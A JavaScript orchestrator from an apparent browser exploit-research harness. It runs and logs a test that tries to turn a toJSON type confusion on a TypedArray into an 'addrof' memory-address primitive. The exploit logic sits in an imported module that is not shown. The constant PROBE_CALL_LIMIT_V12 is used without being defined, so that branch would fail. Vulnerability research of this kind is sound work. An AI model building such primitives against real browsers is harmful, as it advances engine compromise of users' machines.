// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_LimitedProbeCalls,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V12_LPC    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_LimitedProbeCalls";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (LimitedProbeCalls) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_LimitedProbeCalls(); 

    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.probe_calls}`, "info", FNAME_RUNNER);

    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        if (result.errorOccurred.name === 'RangeError') {
            logS3(`     RangeError: Maximum call stack size exceeded OCORREU! (Esperado se o limite da sonda não foi atingido ou foi muito alto)`, "vuln", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-LPC) RangeError!`; 
         } else {
            document.title = `Heisenbug (TypedArray-LPC) ERR: ${result.errorOccurred.name}`;
         }
    } else if (result.potentiallyCrashed) { // Se o RangeError foi tratado como potentiallyCrashed
         logS3(`   RESULTADO: POTENCIAL ESTOURO DE PILHA (RangeError). Detalhes da sonda: ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "critical", FNAME_RUNNER);
         if (!document.title.includes("CONGELOU")) document.title = `Heisenbug (TypedArray-LPC) StackOverflow?`;
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da ÚLTIMA chamada da sonda (capturados): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output (truncado): ${result.stringifyResult ? result.stringifyResult.substring(0, 200) + "..." : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugObservedInProbe = false;
        if (result.toJSON_details && result.toJSON_details.probe_called && 
            result.toJSON_details.this_type_in_toJSON === "[object Object]") {
            heisenbugObservedInProbe = true;
        }

        if (result.addrof_A_attempt_result && result.addrof_A_attempt_result.success) {
             logS3(`     ADDROF A SUCESSO! ${result.addrof_A_attempt_result.message}`, "vuln", FNAME_RUNNER);
        } else if (result.addrof_A_attempt_result) {
             logS3(`     ADDROF A FALHOU: ${result.addrof_A_attempt_result.message}`, heisenbugObservedInProbe ? "warn" : "error", FNAME_RUNNER);
        }
        if (result.addrof_B_attempt_result && result.addrof_B_attempt_result.success) {
             logS3(`     ADDROF B SUCESSO! ${result.addrof_B_attempt_result.message}`, "vuln", FNAME_RUNNER);
        } else if (result.addrof_B_attempt_result) {
             logS3(`     ADDROF B FALHOU: ${result.addrof_B_attempt_result.message}`, heisenbugObservedInProbe ? "warn" : "error", FNAME_RUNNER);
        }

        if (result.toJSON_details && result.toJSON_details.error_in_toJSON) {
            logS3(`     ERRO INTERNO NA SONDA: ${result.toJSON_details.error_in_toJSON}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-LPC) toJSON_ERR`;
        } else if (heisenbugObservedInProbe) {
            logS3(`     !!!! TYPE CONFUSION NO 'this' DA SONDA OBSERVADA !!!! Tipo: ${result.toJSON_details.this_type_in_toJSON}`, "critical", FNAME_RUNNER);
            if (result.toJSON_details.this_was_victim_ref_when_confused !== null) { 
                logS3(`       Na sonda confusa, 'this' === victim_typed_array_ref_v12? ${result.toJSON_details.this_was_victim_ref_when_confused}`, "info");
            }
            if (result.toJSON_details.writes_attempted_on_confused_this) { 
                 logS3(`       Escritas addrof tentadas no 'this' confuso: ${result.toJSON_details.writes_attempted_on_confused_this}`, "info");
            }
            if (result.toJSON_details.recursion_stopped) {
                logS3(`       Recursão da sonda parada pelo limite.`, "info", FNAME_RUNNER);
            }
            if (!document.title.includes("SUCESSO") && !document.title.includes("Addr Falhou")) {
                 document.title = `Heisenbug (TypedArray-LPC) Sonda OK, Addr Falhou`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V12_LPC) || document.title.includes("Probing")) {
            if (!document.title.includes("SUCESSO") && !document.title.includes("Addr Falhou")) {
                 document.title = `Heisenbug (TypedArray-LPC) Test OK`;
            }
        }
        if (result.probe_calls > PROBE_CALL_LIMIT_V12 && !document.title.includes("RangeError")) {
             logS3(`     ALERTA: Limite de chamadas da sonda (${PROBE_CALL_LIMIT_V12}) foi atingido ou excedido (${result.probe_calls})!`, "warn", FNAME_RUNNER);
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (LimitedProbeCalls) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V12_LPC}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (LimitedProbeCalls) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V12_LPC)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Falhou") && 
            !document.title.includes("ERR") && !document.title.includes("TYPE CONFUSION") &&
            !document.title.includes("StackOverflow")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V12_LPC} Concluído`;
        }
    }
}
